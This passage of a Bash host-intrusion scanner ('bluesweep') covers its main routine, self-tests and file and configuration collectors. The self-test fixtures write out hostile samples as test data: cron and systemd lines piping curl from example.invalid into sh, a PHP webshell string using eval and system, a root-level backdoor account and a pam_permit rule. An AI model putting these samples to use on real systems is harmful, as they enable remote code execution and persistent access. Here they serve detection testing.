    when=$(date -u '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null || printf 'unknown')
    os="${DISTRO_ID:-unknown}"
    [[ -r $ROOT/etc/os-release ]] && {
        local l
        while IFS= read -r l; do
            case $l in PRETTY_NAME=*) os=${l#PRETTY_NAME=}; os=${os//\"/} ;; esac
        done < "$ROOT/etc/os-release"
    }
    kern=$(uname -r 2>/dev/null || printf 'unknown')
    priv=unprivileged
    (( CAP_ROOT == 1 )) && priv=root

    meta schema 1
    meta hash "$CAP_HASH"
    case $CAP_HASH in sha256sum|shasum) meta hash_conf strong ;; *) meta hash_conf weak-hash ;; esac
    meta epoch "$(date +%s)"
    meta machine_id "$MACHINE_ID"
    meta version "$VERSION"
    meta host "$host"
    meta when "$when"
    meta os "$os"
    meta kernel "$kern"
    meta mode "$OPT_MODE"
    meta privilege "$priv"
    meta container "$IN_CONTAINER"
    meta root "${ROOT:-/}"
    meta trust "kernel observations plus untrusted userland tools; shell/interpreter may also be tampered"
    meta caps "proc=$CAP_PROC printf=$CAP_FIND_PRINTF stat=$CAP_STAT ps=$CAP_PS hash=${CAP_HASH:-none}"

    col_proc
    col_net
    run_check col_fs

    local c
    local total_budget=60 budget rc
    [[ $OPT_MODE == full ]] && total_budget=300
    for c in $CHECKS_QUICK; do
        budget=$((total_budget - SECONDS + SCAN_START))
        if (( budget <= 0 )); then skip "$c" "overall $OPT_MODE budget exceeded; results INCOMPLETE"; continue; fi
        case $c in chk_webshell|chk_file_metadata|chk_packages|chk_weak_passwords) (( budget > 60 )) && budget=60 ;;
            *) (( budget > STAGE_SECONDS )) && budget=$STAGE_SECONDS ;;
        esac
        run_bounded "$budget" run_check "$c"; rc=$?
        (( rc == 0 )) || skip "$c" "check failed or exceeded budget (rc=$rc); results INCOMPLETE"
    done
}

main() {
    parse_args "$@"
    if [[ -n $OPT_SELFTEST ]]; then selftest_"$OPT_SELFTEST"; return $?; fi
    have awk && have find || { warn "bash, awk and find are required"; return 2; }
    probe_toolbox
    SCAN_START=$SECONDS
    HOST_ID=unknown; MACHINE_ID=unknown
    if [[ -r $ROOT/etc/hostname ]]; then read -r HOST_ID < "$ROOT/etc/hostname";
    elif [[ -z $ROOT ]]; then HOST_ID=$(hostname 2>/dev/null || printf unknown); fi
    [[ ! -r $ROOT/etc/machine-id ]] || read -r MACHINE_ID < "$ROOT/etc/machine-id"
    [[ -z $OPT_DIFF ]] || { validate_diff || return $?; }
    if [[ -n $OPT_BASELINE ]]; then
        prepare_output "$OPT_BASELINE" || return $?
        if [[ $OPT_BASELINE == - ]]; then snapshot_stream; return ${PIPESTATUS[0]}; fi
        snapshot_stream > "$OPT_BASELINE"; local rc=$?
        local digest
        digest=$(hash_stream < "$OPT_BASELINE") || { warn "baseline created but digest unavailable"; rc=3; }
        printf 'Baseline created: %s (%s:%s)\n' "$OPT_BASELINE" "${CAP_HASH:-none}" "$digest" >&2
        return "$rc"
    fi
    local color=1 minrank=10 rc=0 dir="${OPT_IR:-$OPT_OUT}" temporary=0
    [[ -t 1 && -z ${NO_COLOR:-} && ${TERM:-dumb} != dumb && $OPT_NOCOLOR == 0 ]] || color=0
    case $OPT_MINSEV in CRIT) minrank=40 ;; HIGH) minrank=30 ;; MED) minrank=20 ;; INFO) minrank=0 ;; esac
    if [[ -n $dir ]]; then
        mkdir -- "$dir" 2>/dev/null || { warn "evidence directory must be new and writable: $dir"; return 2; }
    elif [[ -n $OPT_REMEDIATE ]]; then
        dir=$(mktemp -d "${TMPDIR:-/tmp}/bluesweep-export.XXXXXXXX") || return 2
        temporary=1
        TEMP_EXPORT=$dir
        trap '[[ -z $TEMP_EXPORT ]] || rm -rf -- "$TEMP_EXPORT"' EXIT
    fi
    EXPORT_DIR=$dir
    if [[ -n $dir && -z $OPT_JSON ]]; then OPT_JSON="$dir/findings.ndjson"; fi
    [[ -z $OPT_JSON ]] || { prepare_output "$OPT_JSON" || return $?; }
    [[ -z $OPT_REMEDIATE ]] || { prepare_output "$OPT_REMEDIATE" || return $?; }
    export BLUESWEEP_JSON="$OPT_JSON"
    set -o pipefail
    if (( OPT_RAW )); then
        scan_stream; rc=$?
    else
        scan_stream | capture_stream "$dir" | json_stream | terminal_stream "$color" "$minrank"
        local -a status=("${PIPESTATUS[@]}")
        rc=${status[3]}
        # JSON stdout calculates severity in json_stream instead of the text renderer.
        [[ $OPT_JSON != - ]] || rc=${status[2]}
        if (( status[0] != 0 || status[1] != 0 )); then warn "collector/output pipeline failed; results INCOMPLETE"; rc=3; fi
        if [[ $OPT_JSON != - ]] && (( status[2] != 0 )); then warn "JSON export failed"; rc=3; fi
    fi
    if [[ -n $dir ]]; then
        [[ -z $OPT_IR ]] || write_ir "$dir" || rc=3
        [[ -z $OPT_REMEDIATE ]] || write_remediation "$dir/records.tsv" "$OPT_REMEDIATE" || rc=3
        (( temporary )) || export_artifacts "$dir" || rc=3
        if (( temporary )); then rm -rf -- "$dir"; TEMP_EXPORT=""; trap - EXIT; fi
    fi
    (( OPT_BENCH == 0 )) || printf 'Benchmark: elapsed=%ss mode=%s; fork count requires external strace (not measured).\n' "$((SECONDS-SCAN_START))" "$OPT_MODE" >&2
    (( OPT_EXITZERO )) && return 0
    return "$rc"
}

capture_stream() { if [[ -n $1 ]]; then tee "$1/records.tsv"; else cat; fi; }
json_stream() { if [[ -n $OPT_JSON ]]; then awk -v exitzero="$OPT_EXITZERO" "$JSON_PROG"; else cat; fi; }
terminal_stream() {
    if [[ $OPT_JSON == - ]]; then cat; else
        awk -v color="$1" -v minrank="$2" -v maxper=8 -v verbose="$OPT_VERBOSE" -v exitzero="$OPT_EXITZERO" "$RENDER_PROG"
    fi
}

# Self-tests keep fixture output in memory; only sandbox mode writes files.
selftest_assert() {
    local label=$1 actual=$2 expected=$3
    if [[ $actual == "$expected" ]]; then
        printf 'PASS %s\n' "$label"
    else
        printf 'FAIL %s: expected <%s>, got <%s>\n' "$label" "$expected" "$actual"
        TEST_FAILURES=$(( TEST_FAILURES + 1 ))
    fi
}

selftest_unit() (
    local TEST_FAILURES=0 result rc
    selftest_assert ipv4-loopback "$(hex2ip 0100007F)" 127.0.0.1
    selftest_assert port-443 "$(hex2port 01BB)" 443
    selftest_assert ipv6-any "$(hex2ip6 00000000000000000000000000000000)" ::
    selftest_assert ipv6-loopback "$(hex2ip6 00000000000000000000000001000000)" ::1
    scrub $'a\tb\nc\rd'
    selftest_assert record-separators "$_SCRUB" 'a b c d'
    result=$(printf 'OBS\tCRON\tfixture\t* * * * * curl https://example.invalid/x | sh\n' | awk "$RULES_PROG" | awk -F '\t' '$1=="FIND"')
    selftest_assert cron-rule "${result%%$'\tCRIT'*}" $'FIND\tPER001'
    result=$(printf 'OBS\tCRON\tfixture\t0 0 * * * /usr/bin/true\n' | awk "$RULES_PROG" | awk -F '\t' '$1=="FIND"')
    selftest_assert clean-cron "$result" ''

    # Remediation must name the service a fix actually endangers, and only when
    # that service is really listening. A constant "could disrupt everything"
    # banner trains the operator to ignore the line that protects uptime.
    local rem_find=$'FIND\tSSH010\tHIGH\tssh\tconfirmed\tPermitRootLogin yes\t/etc/ssh/sshd_config\tev\tharden_sshd'
    result=$(printf 'OBS\tLISTEN\ttcp:0.0.0.0:22\t0|sshd\n%s\n' "$rem_find" \
        | awk -F '\t' "$REMEDIATE_PROG" | awk '/COULD DISRUPT/{print; exit}')
    selftest_assert remediate-live-service "$result" \
        '# COULD DISRUPT SSH - observed listening on port 22. Verify before changing.'
    result=$(printf '%s\n' "$rem_find" \
        | awk -F '\t' "$REMEDIATE_PROG" | awk '/listener observed/{print; exit}')
    selftest_assert remediate-absent-service "$result" \
        '# No ssh listener observed on this host; service impact unlikely.'
    result=$(printf '%s\n' "$rem_find" | awk -F '\t' "$REMEDIATE_PROG" | grep -cv '^[[:space:]]*#\|^[[:space:]]*$')
    selftest_assert remediate-no-executable-lines "$result" 0
    for rc in 0 10 20 30 40; do
        local sev=INFO
        case $rc in 10) sev=LOW ;; 20) sev=MED ;; 30) sev=HIGH ;; 40) sev=CRIT ;; esac
        printf 'FIND\tTEST\t%s\ttest\tconfirmed\ttitle\t-\t-\t-\n' "$sev" |
            awk -v maxper=8 "$RENDER_PROG" >/dev/null
        selftest_assert "exit-$sev" "$?" "$rc"
    done
    result=$(printf 'FIND\tTEST\tERROR\tinternal\tconfirmed\tbroken-check\t-\t-\t-\n' |
        awk -v maxper=8 "$RENDER_PROG"); rc=$?
    selftest_assert error-incomplete "$rc" 3
    case $result in *broken-check*) result=yes ;; *) result=no ;; esac
    selftest_assert error-visible "$result" yes
    printf 'SKIP\tTEST\tmissing capability\nFIND\tTEST\tCRIT\ttest\tconfirmed\ttitle\t-\t-\t-\n' |
        awk -v maxper=8 "$RENDER_PROG" >/dev/null
    selftest_assert skip-overrides-severity "$?" 3
    printf 'SKIP\tTEST\tmissing capability\n' |
        awk -v exitzero=1 "$RENDER_PROG" >/dev/null
    selftest_assert exit-zero "$?" 0
    parse_proc_stat '123 ((we ird) x) S 42 42 42 0 0 0'
    selftest_assert proc-comm "$PARSED_COMM" '(we ird) x'
    selftest_assert proc-ppid "$PARSED_PPID" 42
    selftest_assert ipv6-mapped "$(hex2ip6 0000000000000000FFFF00000100007F)" ::ffff:127.0.0.1
    result=$(printf '%s\n' '<?php eval(base64_decode($_POST["x"])); system($_GET["cmd"]);' | awk "$WEBSHELL_PROG" | awk -F '\t' '$1=="FIND"{print $3}')
    selftest_assert webshell-score "$result" CRIT
    result=$(printf '%s\n' '<?php echo "hello";' | awk "$WEBSHELL_PROG")
    selftest_assert clean-webscript "$result" ''
    local path command expected
    while IFS='|' read -r path command expected; do
        result=$(printf 'OBS\tCONFIG\t%s\t%s\n' "$path" "$command" | awk "$CONFIG_RULES" | awk -F '\t' '$1=="FIND"{print $2}')
        selftest_assert "$expected" "$result" "$expected"
    done <<'FIXTURES'
/etc/pam.d/test|auth sufficient pam_permit.so|PAM002
/etc/udev/rules.d/test|RUN+="/tmp/test"|PER110
/etc/modprobe.d/test|install test /bin/true|PER111
/etc/apt/apt.conf.d/test|APT::Update::Post-Invoke { "true"; };|PER112
/etc/postfix/main.cf|mynetworks = 0.0.0.0/0|SMTP002
/etc/bind/named.conf|allow-transfer { any; };|DNS002
/etc/vsftpd.conf|anon_upload_enable=YES|FTP002
/etc/mysql/my.cnf|skip-grant-tables|SQL001
/etc/php.ini|auto_prepend_file=/tmp/test|WEB101
/etc/exports|/srv host(no_root_squash)|NFS001
/etc/samba/smb.conf|wide links = yes|SMB002
FIXTURES
    result=$(printf 'OBS\tAGENT\tauditd\trunning\nMARK\nOBS\tAGENT\tauditd\tstopped\n' | awk "$DIFF_PROG" | awk -F '\t' '$1=="FIND"{print $3}')
    selftest_assert stopped-agent-drift "$result" CRIT
    result=$(printf 'OBS\tFILE\t/etc/passwd\t644:0:0:20:1:abc\nMARK\nOBS\tFILE\t/etc/passwd\t644:0:0:20:2:abc\n' | awk "$DIFF_PROG" | awk -F '\t' '$1=="FIND"{print $3}')
    selftest_assert mtime-only-drift "$result" MED
    printf 'Unit tests: %d failures\n' "$TEST_FAILURES"
    (( TEST_FAILURES == 0 )) || return 4
)

selftest_sandbox() (
    local TEST_FAILURES=0 sandbox result id
    sandbox=$(mktemp -d "${TMPDIR:-/tmp}/bluesweep-selftest.XXXXXXXX") || return 4
    trap 'rm -rf -- "$sandbox"' EXIT
    trap 'exit 4' INT TERM
    printf 'Sandbox: %s\n' "$sandbox"
    ROOT=$sandbox PROCFS=$sandbox/proc
    CAP_ROOT=0 CAP_PROC=0
    mkdir -p "$ROOT/etc/cron.d" "$ROOT/etc/systemd/system" "$ROOT/root/.ssh" || return 4
    printf 'root:x:0:0:root:/root:/bin/bash\n' > "$ROOT/etc/passwd"
    printf 'root:!:1:0:99999:7:::\n' > "$ROOT/etc/shadow"
    printf '0 0 * * * root /usr/bin/true\n' > "$ROOT/etc/crontab"
    printf '[Service]\nExecStart=/usr/bin/true\n' > "$ROOT/etc/systemd/system/clean.service"
    printf 'ssh-ed25519 AAAA fixture\n' > "$ROOT/root/.ssh/authorized_keys"
    result=$({ run_check chk_accounts; run_check chk_authkeys; run_check chk_ldpreload;
        run_check chk_cron; run_check chk_systemd; } | awk "$RULES_PROG" |
        awk -F '\t' '$1 == "FIND" {print $2}')
    selftest_assert clean-detectors "$result" ''
    printf 'intruder:x:0:0:fixture:/root:/bin/bash\n' >> "$ROOT/etc/passwd"
    printf 'intruder::1:0:99999:7:::\n' >> "$ROOT/etc/shadow"
    printf '/tmp/benign-fixture.so\n' > "$ROOT/etc/ld.so.preload"
    printf '* * * * * root curl https://example.invalid/fixture | sh\n' >> "$ROOT/etc/crontab"
    printf '[Service]\nExecStart=/bin/sh -c "curl https://example.invalid/fixture | sh"\n' > "$ROOT/etc/systemd/system/fixture.service"
    printf 'command="/tmp/fixture" ssh-ed25519 AAAA fixture\n' > "$ROOT/root/.ssh/authorized_keys"
    result=$({ run_check chk_accounts; run_check chk_authkeys; run_check chk_ldpreload;
        run_check chk_cron; run_check chk_systemd; } | awk "$RULES_PROG" |
        awk -F '\t' '$1 == "FIND" {print $2}')
    for id in ACC001 ACC002 ACC014 LDP001 PER001 PER002 SSH002; do
        case $'\n'"$result"$'\n' in
            *$'\n'"$id"$'\n'*) selftest_assert "$id" yes yes ;;
            *) selftest_assert "$id" no yes ;;
        esac
    done
    local count=0 line
    while IFS= read -r line; do [[ $line == SSH002 ]] && count=$((count + 1)); done <<< "$result"
    selftest_assert shared-home-key-dedup "$count" 1
    mkdir -p "$ROOT/var/www" "$ROOT/etc/pam.d" "$ROOT/tmp"
    printf '%s\n' '<?php eval(base64_decode($_POST["x"])); system($_GET["cmd"]);' > "$ROOT/var/www/fixture.php"
    printf 'auth sufficient pam_permit.so\n' > "$ROOT/etc/pam.d/fixture"
    printf 'fixture only, never execute\n' > "$ROOT/tmp/bash"
    chmod 4755 "$ROOT/tmp/bash"
    ln -s /dev/null "$ROOT/root/.bash_history"
    CAP_FIND_PRINTF=1
    result=$({ emit_sig_tables; col_fs; chk_configs; chk_webshell; chk_logs; } | awk "$RULES_PROG" | awk "$CONFIG_RULES" | awk -F '\t' '$1=="FIND"{print $2}')
    for id in PAM002 WEB001 SUI010 LOG002; do
        case $'\n'"$result"$'\n' in
            *$'\n'"$id"$'\n'*) selftest_assert "$id" yes yes ;;
            *) selftest_assert "$id" no yes ;;
        esac
    done
    mkdir -p "$ROOT/proc/net"
    printf 'sl local_address rem_address st tx_queue rx tr tm retr uid timeout inode\n 0: 0100007F:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 123 1\n' > "$ROOT/proc/net/tcp"
    LISTEN_ROWS=(); col_net >/dev/null
    selftest_assert proc-listener "${LISTEN_ROWS[0]:-missing}" 'tcp|127.0.0.1|22|0|123'
    printf 'Sandbox tests: %d failures; coverage: accounts, keys, preload, cron, systemd.\n' "$TEST_FAILURES"
    printf 'Environment-gated: live hidden PID/socket/module attacks, ftrace, immutable enforcement, firewall/MAC and package verification; not simulated here.\n'
    (( TEST_FAILURES == 0 )) || return 4
)

# ---------------------------------------------------------------------------
# Bounded filesystem and configuration collectors
# ---------------------------------------------------------------------------
MAX_FILES=20000
MAX_PER_CAT=200
STAGE_SECONDS=30
RECENT_DAYS=7
SCAN_START=0
FILES=()
declare -A FILE_SIZES=()
CONFIG_FILES=()
WEB_FILES=()
DISCOVERED_ROOTS=()
TEMP_EXPORT=""
EXPORT_DIR=""

# Execute only our own child in a new job group. The watchdog terminates that
# group, never a scanned process. No timeout(1), temp file, or daemon required.
run_bounded() (
    local seconds=$1 child guard rc remaining; shift
    if [[ ${BOUND_DEADLINE:-0} != 0 ]]; then
        remaining=$((BOUND_DEADLINE-SECONDS))
        (( remaining > 0 )) || return 124
        (( seconds <= remaining )) || seconds=$remaining
    fi
    BOUND_DEADLINE=$((SECONDS+seconds))
    set -m
    "$@" & child=$!
    (
        sleep "$seconds"
        kill -TERM -- "-$child" 2>/dev/null
        sleep 1
        kill -KILL -- "-$child" 2>/dev/null
    ) & guard=$!
    wait "$child" 2>/dev/null; rc=$?
    kill -TERM -- "-$guard" 2>/dev/null
    wait "$guard" 2>/dev/null
    (( rc == 143 || rc == 137 )) && return 124
    return "$rc"
) 2>/dev/null

hash_stream() (
    set -o pipefail
    case $CAP_HASH in
        shasum) shasum -a 256 ;;
        sha256sum|sha1sum|md5sum|cksum) "$CAP_HASH" ;;
        *) return 1 ;;
    esac | awk '{print $1}'
)

logical_path() { LOGICAL=${1#"$ROOT"}; [[ $LOGICAL == /* ]] || LOGICAL=/$LOGICAL; }

# find receives paths as arguments and emits NUL fields: hostile filenames
# cannot forge records. Quick has fixed roots AND a depth limit.
col_fs() {
    if (( CAP_FIND_PRINTF == 0 )); then skip FS000 "GNU find -printf required"; return; fi
    local -a roots=() prune=() args=() filters=()
    local d src mount type opts rest rc f mode uid gid size mtime kind n=0
    discover_webroots
    local -A done=()
    if [[ $OPT_MODE == full ]]; then
        roots=("${ROOT:-/}")
        if [[ -z $ROOT && -r /proc/mounts ]]; then
            while read -r src mount type opts rest; do
                # Decode only mount-table octal escapes, never arbitrary shell text.
                mount=${mount//\\040/ }; mount=${mount//\\011/$'\t'}; mount=${mount//\\134/\\}
                case $mount in /|/proc|/proc/*|/sys|/sys/*|/dev|/dev/*|/run|/run/*|/snap|/snap/*|/var/lib/docker*|/var/lib/containers*) continue ;; esac
                case $type in
                    ext2|ext3|ext4|xfs|btrfs|zfs|jfs|reiserfs|overlay|tmpfs)
                        [[ -n ${done[$mount]:-} ]] || { roots+=("$mount"); done[$mount]=1; } ;;
                    *) prune+=(-path "$mount" -o) ;;
                esac
            done < /proc/mounts
        fi
    else
        for d in etc usr/bin usr/sbin usr/lib usr/lib64 usr/libexec usr/local/bin usr/local/sbin bin sbin tmp var/tmp dev/shm home root opt srv var/www; do
            [[ -d $ROOT/$d ]] && roots+=("$ROOT/$d")
        done
        roots+=("${DISCOVERED_ROOTS[@]}")
        args=(-maxdepth 4)
    fi
    local -a remote=() localroots=()
    if [[ -r /proc/mounts ]]; then
        while read -r src mount type opts rest; do
            case $type in nfs*|cifs|smb3|fuse*|9p|afs|ceph|glusterfs)
                mount=${mount//\\040/ }; mount=${mount//\\134/\\}
                remote+=("$mount"); prune+=(-path "$mount" -o) ;;
            esac
        done < /proc/mounts
    fi
    local blocked
    for d in "${roots[@]}"; do
        blocked=0
        for mount in "${remote[@]}"; do
            [[ $d == "$mount" || $d == "$mount/"* ]] && blocked=1
        done
        if (( blocked )); then skip FS003 "remote/FUSE root excluded: $d";
        else localroots+=("$d"); fi
    done
    roots=("${localroots[@]}")
    (( ${#roots[@]} )) || { skip FS000 "no filesystem roots available"; return; }
    for d in proc sys dev run snap var/lib/docker var/lib/containers; do
        # /dev/shm is an explicit quick root and a separate bounded full probe.
        prune+=(-path "$ROOT/$d" -o)
    done
    # Explicit output destinations must never become scan inputs, including a
    # snapshot that is being written concurrently with the collector.
    local output parent
    for output in "$OPT_BASELINE" "$OPT_DIFF" "$OPT_JSON" "$OPT_REMEDIATE" "$OPT_OUT" "$OPT_IR" "$EXPORT_DIR"; do
        [[ -n $output && $output != - ]] || continue
        parent=$(cd -- "$(dirname -- "$output")" 2>/dev/null && pwd -P) || continue
        output="$parent/${output##*/}"
        prune+=(-path "$output" -o)
    done
    prune+=(-false)
    filters=(-perm -4000 -o -perm -2000 -o -perm -0002 -o -mtime "-$RECENT_DAYS"
        -o -path "$ROOT/etc/*" -o -path "$ROOT/usr/bin/*" -o -path "$ROOT/usr/sbin/*"
        -o -path "$ROOT/bin/*" -o -path "$ROOT/sbin/*"
        -o -name '.*' -o -name '*[[:cntrl:]]*' -o -path '*/.ssh/*' -o -name 'authorized_keys*'
        -o -iname '*.php' -o -iname '*.phtml' -o -iname '*.php[0-9]' -o -iname '*.inc'
        -o -iname '*.jsp' -o -iname '*.jspx' -o -iname '*.asp' -o -iname '*.aspx'
        -o -iname '*.ico' -o -iname '*.jpg' -o -iname '*.png'
        -o -path '*/.config/autostart/*' -o -path '*/.config/systemd/user/*')
    local signature
    while IFS= read -r signature; do
        [[ -n $signature ]] || continue
        case $signature in */*) filters+=(-o -path "*/$signature") ;; *) filters+=(-o -name "$signature") ;; esac
    done <<< "$SIG_INTERESTING"
    local -A counts=()
    # A status sentinel travels through the same pipe as data, so find errors
    # and watchdog expiration cannot be lost behind process substitution.
    while IFS= read -r -d '' f; do
        if [[ $f == @STATUS ]]; then
            IFS= read -r -d '' rc
            [[ $rc == 0 ]] || skip FS000 "filesystem enumeration failed or budget exceeded (rc=$rc); results INCOMPLETE"
            continue
        fi
        IFS= read -r -d '' mode; IFS= read -r -d '' uid; IFS= read -r -d '' gid
        IFS= read -r -d '' size; IFS= read -r -d '' mtime; IFS= read -r -d '' kind
        n=$((n + 1))
        if (( n > MAX_FILES )); then
            (( n == MAX_FILES + 1 )) && skip FS001 "candidate cap $MAX_FILES exceeded; truncated=1"
            continue
        fi
        logical_path "$f"
        obs FSMETA "$LOGICAL" "$mode:$uid:$gid:$size:$mtime:$kind"
        if [[ $f == *[[:cntrl:]]* ]]; then
            finding FS002 HIGH integrity confirmed "Filename contains control characters" "$LOGICAL" "untrusted-source=find; record separators sanitized" inspect_file
            continue
        fi
        if [[ $kind == f ]]; then
            FILES+=("$f"); FILE_SIZES[$f]=$size
            case $LOGICAL in
                /etc/*|*.conf|*.ini|*.cfg|*.yaml|*.yml|*.xml|*/.htaccess|*/.user.ini|*/.forward|*/.config/autostart/*|*/.config/systemd/user/*) CONFIG_FILES+=("$f") ;;
            esac
            case ${f,,} in *.php|*.phtml|*.php[0-9]|*.inc|*.jsp|*.jspx|*.asp|*.aspx|*.ico|*.jpg|*.png) (( size < 2097152 )) && WEB_FILES+=("$f") ;; esac
        fi
        local bits=$((8#$mode)) cat
        if (( (bits & 06000) != 0 )) && [[ $kind == f ]]; then
            obs SUID "$LOGICAL" "$mode"
            emit_raw "OBS${TAB}SUIDROW${TAB}$mode${TAB}$uid${TAB}$gid${TAB}$size${TAB}$LOGICAL"
        fi
        if (( (bits & 0002) != 0 )) && { [[ $kind == f ]] || { [[ $kind == d ]] && (( (bits & 01000) == 0 )); }; }; then
            cat=worldwrite
            counts[$cat]=$(( ${counts[$cat]:-0} + 1 ))
            if (( counts[$cat] <= MAX_PER_CAT )); then
                finding FS010 MED integrity untrusted-source "World-writable file or directory without sticky protection" "$LOGICAL" "mode=$mode uid=$uid" fix_perms
            elif (( counts[$cat] == MAX_PER_CAT + 1 )); then skip FS010 "finding cap exceeded; truncated=1"; fi
        fi
        if [[ $kind == f && $uid == 0 ]] && (( (bits & 0002) != 0 && (bits & 0111) != 0 )); then
            finding FS012 HIGH integrity untrusted-source "World-writable root-owned executable" "$LOGICAL" "mode=$mode" fix_perms
        fi
        if [[ $kind == f && $LOGICAL == /etc/* && $gid != 0 ]] && (( (bits & 0020) != 0 )); then
            finding FS013 MED integrity untrusted-source "System configuration writable by a non-root group" "$LOGICAL" "mode=$mode gid=$gid; may be intentional delegation" fix_perms
        fi
        if [[ $kind == f && $LOGICAL == /etc/* ]] && (( (bits & 0002) != 0 )); then
            finding FS011 HIGH integrity untrusted-source "World-writable system configuration" "$LOGICAL" "mode=$mode" fix_perms
        fi
    done < <(
        run_bounded "$STAGE_SECONDS" find "${roots[@]}" -xdev "${args[@]}" \
            \( "${prune[@]}" \) -prune -o \( -type f -o -type d \) \( "${filters[@]}" \) \
            -printf '%p\0%m\0%U\0%G\0%s\0%T@\0%y\0'
        printf '@STATUS\0%d\0' "$?"
    )
    ok FS000 "$n filesystem entries inspected; mode=$OPT_MODE; untrusted-source=find"
}

chk_file_metadata() {
    local f info bits uid gid size mt mode h n=0 started=$SECONDS now
    local -A users=() groups=()
    local name p id rest
    if [[ -r $ROOT/etc/passwd ]]; then
        while IFS=: read -r name p id rest; do [[ -n $id ]] && users[$id]=1; done < "$ROOT/etc/passwd"
    fi
    if [[ -r $ROOT/etc/group ]]; then
        while IFS=: read -r name p id rest; do [[ -n $id ]] && groups[$id]=1; done < "$ROOT/etc/group"
    fi
    now=$(date +%s)
    for f in "${FILES[@]}"; do
        (( SECONDS - started < 60 )) || { skip INT000 "metadata/hash budget exceeded; results INCOMPLETE"; break; }
        logical_path "$f"
        case $LOGICAL in /etc/*|*/authorized_keys*|*/.ssh/rc|*/.bashrc|*/.profile|*/.forward|*/.htaccess|*/.user.ini|*/.ssh/id_*|*/.netrc|*/.my.cnf|*/.pgpass|*/.vnc/passwd) ;;
            *) [[ $OPT_MODE == full ]] || continue ;;
        esac
        info=$(stat -c '%a:%u:%g:%s:%Y' -- "$f" 2>/dev/null) || { skip INT001 "cannot stat $LOGICAL"; continue; }
        IFS=: read -r mode uid gid size mt <<< "$info"
        bits=$((8#$mode))
        if [[ -r $ROOT/etc/passwd && -z ${users[$uid]:-} ]] || [[ -r $ROOT/etc/group && -z ${groups[$gid]:-} ]]; then
            finding INT002 MED integrity untrusted-source "File has an orphaned numeric owner or group" "$LOGICAL" "$info" inspect_file
        fi
        case $LOGICAL in
            /etc/shadow|/etc/gshadow|*/.ssh/id_*|*/.netrc|*/.my.cnf|*/.pgpass|*/.vnc/passwd)
                case $LOGICAL in *.pub) ;; *)
                    (( (bits & 0004) != 0 )) && finding INT003 HIGH hardening untrusted-source "World-readable credential file" "$LOGICAL" "mode=$mode; content withheld" fix_perms ;;
                esac ;;
        esac
        case $LOGICAL in /etc/*|/usr/bin/*|/usr/sbin/*|/bin/*|/sbin/*)
            if (( now - mt < RECENT_DAYS * 86400 )); then
                finding INT004 INFO integrity untrusted-source "Recently modified system file" "$LOGICAL" "mtime=$mt; recent_days=$RECENT_DAYS" inspect_file
            fi ;;
        esac
        if [[ -n $CAP_HASH && -r $f ]] && (( size <= 2097152 )); then
            h=$(run_bounded 2 bash -c 'case "$1" in shasum) shasum -a 256 -- "$2";; *) "$1" -- "$2";; esac' _ "$CAP_HASH" "$f")
            if [[ $? == 0 && -n $h ]]; then h=${h%% *}; else h=unavailable; skip INT005 "cannot hash $LOGICAL"; fi
        else
            h=metadata-only
            [[ -n $CAP_HASH ]] || skip INT005 "no hashing utility; content changes may be missed"
        fi
        obs FILE "$LOGICAL" "$info:$h"
        n=$((n + 1))
    done
    ok INT000 "$n file fingerprints inventoried; algorithm=${CAP_HASH:-none}"
}

# All configuration detectors consume the same bounded candidate set. Paths
# select a grammar; suspicious command tests never execute target content.
chk_configs() {
    local f line n=0 start=$SECONDS
    for f in "${CONFIG_FILES[@]}"; do
        (( SECONDS - start < STAGE_SECONDS )) || { skip CFG000 "configuration scan budget exceeded"; break; }
        logical_path "$f"
        case $LOGICAL in
            /etc/redis*|/etc/postgresql/*|/etc/mongo*|/etc/mosquitto/*|/etc/rsyncd*|/etc/supervisor*|/etc/snmp*|/etc/elasticsearch/*|/etc/grafana/*|/etc/docker/*|/etc/kubernetes/*|/etc/NetworkManager/*|/etc/logrotate*|/etc/rsyslog*|/etc/audit/*|/etc/sssd/*|/etc/openvpn/*|/etc/ipsec*|*/pg_hba.conf|*/redis.conf|*/mongod.conf|*/supervisord.conf|*/config.xml|/etc/udev/rules.d/*|/etc/modprobe.d/*|/etc/apt/apt.conf.d/*|/etc/dnf/*|/etc/yum*|/etc/init.d/*|/etc/rc.local|/etc/inittab|/etc/xinetd.d/*|/etc/inetd.conf|/etc/rc*.d/*|*/.config/autostart/*|/etc/xdg/autostart/*|/etc/systemd/*|/etc/pam.d/*|/etc/ssh/sshd_config.d/*|/etc/nginx/*|/etc/apache2/*|/etc/httpd/*|/etc/php*|/etc/postfix/*|/etc/exim*|/etc/aliases|*/.forward|/etc/bind/*|/etc/named*|/etc/vsftpd*|/etc/proftpd*|/etc/mysql/*|/etc/my.cnf*|/etc/exports*|/etc/samba/*|/etc/nsswitch.conf|*/.htaccess|*/.user.ini) ;;
            *) continue ;;
        esac
        [[ -r $f && ! -L $f ]] || { skip CFG000 "unreadable or symlinked config: $f"; continue; }
        # Size ceiling prevents huge/binary files from becoming shell variables.
        local size
        size=$(stat -c %s -- "$f" 2>/dev/null) || continue
        (( size < 2097152 )) || { skip CFG000 "config larger than 2 MiB: $LOGICAL"; continue; }
        while IFS= read -r line || [[ -n $line ]]; do
            line=${line%$'\r'}
            [[ $line =~ ^[[:space:]]*(#|\;|$) ]] && continue
            obs CONFIG "$LOGICAL" "$line"
            n=$((n + 1))
        done < "$f"
    done
    ok CFG000 "$n configuration lines inspected; includes remain static analysis"
}

read -r -d '' CONFIG_RULES <<'AWKEOF' || true
BEGIN {FS=OFS="\t"}
function emit(id,sev,title) {print "FIND",id,sev,"configuration","possible",title,p,v,"review_config"}
$1=="OBS" && $2=="PRIVCFG" {
    print; p=$3; v=$4; s=tolower(v)
    if(p ~ /doas.conf/ && s ~ /permit[ \t]+nopass/) emit("PRIV010","HIGH","doas passwordless privilege grant")
    if(p ~ /sudoers/ && s ~ /!authenticate|setenv|env_keep.*(ld_preload|ld_library_path|pythonpath|bash_env)/) emit("PRIV011","HIGH","sudo preserves dangerous environment or disables authentication")
    if(p ~ /polkit/ && s ~ /polkit[.]result[.]yes|resultactive[ \t]*=[ \t]*yes/) emit("PRIV012","HIGH","Polkit policy grants authorization; verify subject and action restrictions")
    if(p ~ /dbus/ && s ~ /allow[ \t].*(own|send_destination)[ \t]*=[ \t]*[\042\047]\*/) emit("PRIV013","HIGH","D-Bus wildcard authorization rule")
    if(p ~ /capability.conf/ && s ~ /cap_setuid|cap_sys_admin|cap_dac_override/) emit("PRIV014","HIGH","PAM assigns powerful capabilities")
    next
}
$1=="OBS" && $2=="CONFIG" {
    print
    p=$3; v=$4; s=tolower(v)
